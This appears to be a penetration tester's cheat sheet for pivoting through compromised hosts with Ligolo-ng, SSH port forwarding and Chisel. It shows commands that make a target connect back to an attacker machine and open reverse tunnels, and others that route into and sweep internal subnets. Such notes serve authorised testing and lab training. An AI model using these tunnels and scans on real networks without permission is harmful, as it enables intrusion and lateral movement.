
# Pivoting with Ligolo-ng

## Start Proxy

```sh
sudo ligolo-proxy -selfcert
```

## Transfer the Agent

Transfer the `agent.exe` to target

```sh
.\agent.exe -connect <HOST-IP>:11601 -ignore-cert
```

## On Host

```sh
ligolo-ng >> session
? Specify a session : 1

ligolo-ng >> help

# autorote -> setup everything for you
ligolo-ng >> autoroute
# select the internal network you want to access here

# Then select the Create a new interface
? Create a new interface

# Start the tunnel
? Start the tunnel? Yes
```

## Find Hosts

```sh
nxc smb 10.0.2.0/24 # The new subnet you've access to
```

# Double Pivoting with Ligolo-ng

## First Agent

```sh
sudo ip tuntap add user kali mode tun ligolo
```

```sh
sudo ip link set ligolo up
```

```sh
sudo ligolo-proxy -selfcert

? Enable Ligolo-ng WebUI? No
```

Transfer the `agent` to the target

```sh
# On Target
.\agent.exe -connect 10.10.15.1:11601 -ignore-cert
```

```sh
# On Host
ligolo-ng >> session
? Specify a session: 1

[Agent : ...] >> start --tun ligolo
```

```sh
sudo ip route add 172.16.5.0/24 dev ligolo # Subnet we want to access
```

Test it:
```sh
ping 172.16.5.15
```

First pivot is done.

Routes:
```sh
ip route
```

## Second Agent

```sh
sudo ip tuntap add user kali mode tun ligolo-double
```

```sh
sudo ip link set ligolo-double up
```

```sh
[Agent: ...] >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

[Agent: ...] >> listener_list
```

On second target:
```sh
.\agent.exe -connect 172.16.5.15:11601 -ignore-cert # Our first pivot's IP
```

On host:
```sh
[Agent: ...] >> session
? Specify a session: 2
```

```sh
sudo ip route add 172.16.6.0/24 dev ligolo-double
```

```sh
[Agent: ...] >> start --tun ligolo-double
```
# SSH
## Single Port Forwarding

```sh
ssh -L 1234:localhost:3306 username@IP
```

# Dynamic Port Forwarding

```sh
ssh -D 9050 username@IP
```

# Routing Table

```sh
netstat -r
```

# Chisel

# Start

```bash
chisel server -p 9999 --reverse
```

# Agent

```bash
.\chisel.exe client <KALI_IP>:9999 R:8888:127.0.0.1:8888
```

8888 -> the port we want to be able to access
